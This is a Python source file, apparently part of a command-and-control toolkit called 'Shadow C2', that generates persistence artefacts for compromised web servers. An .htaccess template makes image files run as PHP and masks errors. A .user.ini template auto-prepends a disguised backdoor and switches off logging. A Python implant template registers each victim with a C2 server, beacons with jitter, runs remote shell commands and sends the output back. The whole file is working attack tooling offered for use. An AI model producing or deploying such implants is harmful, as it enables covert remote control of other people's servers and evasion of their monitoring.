#!/usr/bin/env python3
"""Shadow C2 — .htaccess + .user.ini + Python templates"""

class HtaccessTemplate:
    def generate(self, backdoor_filename: str = "logo.jpg") -> str:
        ext = backdoor_filename.rsplit(".", 1)[-1] if "." in backdoor_filename else "jpg"
        return f"""# Apache configuration — Shadow C2
<FilesMatch "\\.{ext}$">
    SetHandler application/x-httpd-php
</FilesMatch>
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{{REQUEST_URI}} \\.{ext}$ [NC]
    RewriteRule .* - [L]
</IfModule>
Options -Indexes
ServerSignature Off
<Files .htaccess>
    Order allow,deny
    Deny from all
</Files>
ErrorDocument 403 "Not Found"
ErrorDocument 404 "Not Found"
ErrorDocument 500 "Not Found"
"""


class UserIniTemplate:
    def generate(self, backdoor_filename: str = "logo.jpg") -> str:
        return f"""; PHP configuration — Shadow C2
auto_prepend_file = {backdoor_filename}
max_execution_time = 0
memory_limit = -1
upload_max_filesize = 50M
post_max_size = 50M
display_errors = Off
log_errors = Off
error_reporting = 0
"""


class PythonRawTemplate:
    def generate(self, c2_url: str, encryption_key: str) -> str:
        return f'''#!/usr/bin/env python3
"""Shadow C2 — Python Backdoor"""
import os, sys, subprocess, json, uuid, time, base64, socket
import urllib.request, urllib.error, ssl

C2_URL = "{c2_url}"
ENC_KEY = "{encryption_key}"
VICTIM_UUID = str(uuid.uuid4())

def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def http_post(url, data):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, data=json.dumps(data).encode(),
            headers={{"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}})
        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
            return json.loads(resp.read())
    except: return {{}}

def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout + result.stderr
    except Exception as e:
        return f"[!] Error: {{e}}"

def sysinfo():
    return {{
        "uuid": VICTIM_UUID,
        "hostname": socket.gethostname(),
        "os": sys.platform,
        "arch": os.uname().machine if hasattr(os, "uname") else "unknown",
        "php_version": f"Python/{{sys.version_info.major}}.{{sys.version_info.minor}}",
        "server_software": "",
        "document_root": os.getcwd(),
        "ip": "",
        "disabled_functions": "",
        "writable_dirs": ",".join([d for d in ["/tmp", "/var/tmp", os.getcwd()] if os.access(d, os.W_OK)]),
    }}

def main():
    # Register
    http_post(C2_URL + "/api/register", sysinfo())

    # Beacon loop
    while True:
        try:
            resp = http_post(C2_URL + "/api/beacon",
                {{"uuid": VICTIM_UUID, "timestamp": int(time.time())}})
            tasks = resp.get("tasks", [])
            for task in tasks:
                output = exec_cmd(task["command"])
                http_post(C2_URL + "/api/results", {{
                    "uuid": VICTIM_UUID,
                    "task_id": task["id"],
                    "output": output,
                    "status": "completed"
                }})
        except: pass
        time.sleep(30 + int(time.time()) % 15)  # Jitter

if __name__ == "__main__":
    main()
'''
